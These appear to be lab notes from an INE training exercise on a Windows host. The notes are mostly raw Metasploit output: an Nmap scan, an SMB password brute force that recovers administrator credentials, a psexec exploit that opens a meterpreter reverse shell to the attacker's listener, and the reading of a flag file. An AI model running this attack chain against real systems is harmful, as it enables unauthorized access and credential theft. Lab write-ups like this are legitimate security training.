# Exploiting SMB with PsExec

```bash
Nmap scan report for demo.ine.local (10.0.24.255)
Host is up (0.0022s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-16T01:01:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-408S766
| Not valid before: 2025-07-15T00:53:58
|_Not valid after:  2026-01-14T00:53:58
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-408S766
|   NetBIOS_Domain_Name: EC2AMAZ-408S766
|   NetBIOS_Computer_Name: EC2AMAZ-408S766
|   DNS_Domain_Name: EC2AMAZ-408S766
|   DNS_Computer_Name: EC2AMAZ-408S766
|   Product_Version: 10.0.14393
|_  System_Time: 2025-07-16T01:01:41+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-16T01:01:41
|_  start_date: 2025-07-16T00:53:57



# SMB bruteforce
# start MSF colsole
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login  .                normal  No     SMB Login Check Scanner


msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/smb/smb_login) > set VERBOSE false

[+] 10.0.24.255:445       - 10.0.24.255:445 - Success: '.\demo:victoria'
[+] 10.0.24.255:445       - 10.0.24.255:445 - Success: '.\auditor:elizabeth'
[+] 10.0.24.255:445       - 10.0.24.255:445 - Success: '.\administrator:qwertyuiop' Administrator                                                   
[*] 10.0.24.255:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.0.24.255:445       - Bruteforce completed, 4 credentials were successful.
[*] 10.0.24.255:445       - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed



psexec.py Administrator@10.0.24.255 cmd.exe

msf6 auxiliary(scanner/smb/smb_login) > search psexec
msf6 auxiliary(scanner/smb/smb_login) > use 24
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > 

msf6 exploit(windows/smb/psexec) > set SMBPass Interrupt: use the 'exit' command to quit
msf6 exploit(windows/smb/psexec) > ser SMBPass qwertyuiop
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(windows/smb/psexec) > set SMBPass qwertyuiop
SMBPass => qwertyuiop
msf6 exploit(windows/smb/psexec) > ser SMBUser Administrator
[-] Unknown command: ser. Did you mean set? Run the help command for more details.
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.24.255
RHOSTS => 10.0.24.255

msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.43.2:4444 
[*] 10.0.24.255:445 - Connecting to the server...
[*] 10.0.24.255:445 - Authenticating to 10.0.24.255:445 as user 'Administrator'...
[*] 10.0.24.255:445 - Selecting PowerShell target
[*] 10.0.24.255:445 - Executing the payload...
[+] 10.0.24.255:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.0.24.255
[*] Meterpreter session 1 opened (10.10.43.2:4444 -> 10.0.24.255:49812) at 2025-07-16 06:59:07 +0530



meterpreter > cd ..
meterpreter > ls
Listing: C:\
============

Mode          Size    Type  Last modified          Name
----          ----    ----  -------------          ----
040777/rwxrw  0       dir   2020-09-25 12:04:38 +  $Recycle.Bin
xrwx                        0530
100666/rw-rw  1       fil   2016-07-16 18:48:08 +  BOOTNXT
-rw-                        0530
040777/rwxrw  8192    dir   2020-09-09 10:22:55 +  Boot
xrwx                        0530
040777/rwxrw  0       dir   2016-10-18 07:29:39 +  Documents and Setting
xrwx                        0530                   s
040777/rwxrw  0       dir   2018-02-23 16:36:05 +  PerfLogs
xrwx                        0530
040555/r-xr-  4096    dir   2017-12-14 02:30:56 +  Program Files
xr-x                        0530
040777/rwxrw  4096    dir   2020-09-25 12:13:29 +  Program Files (x86)
xrwx                        0530
040777/rwxrw  4096    dir   2016-11-24 05:49:28 +  ProgramData
xrwx                        0530
040777/rwxrw  0       dir   2016-10-18 07:31:27 +  Recovery
xrwx                        0530
040777/rwxrw  0       dir   2020-09-25 11:43:59 +  System Volume Informa
xrwx                        0530                   tion
040555/r-xr-  4096    dir   2020-09-25 11:45:39 +  Users
xr-x                        0530
040777/rwxrw  28672   dir   2020-09-25 11:44:14 +  Windows
xrwx                        0530
040777/rwxrw  0       dir   2020-09-25 12:11:47 +  admin
xrwx                        0530
100444/r--r-  388690  fil   2020-09-02 13:52:08 +  bootmgr
-r--                        0530
100666/rw-rw  32      fil   2020-09-25 12:11:35 +  flag.txt
-rw-                        0530
000000/-----  0       fif   1970-01-01 05:30:00 +  pagefile.sys
----                        0530
040777/rwxrw  0       dir   2020-09-25 12:12:16 +  public
xrwx                        0530

meterpreter > cat flag.txt
e0da81a9cd42b261bc9b90d15f780433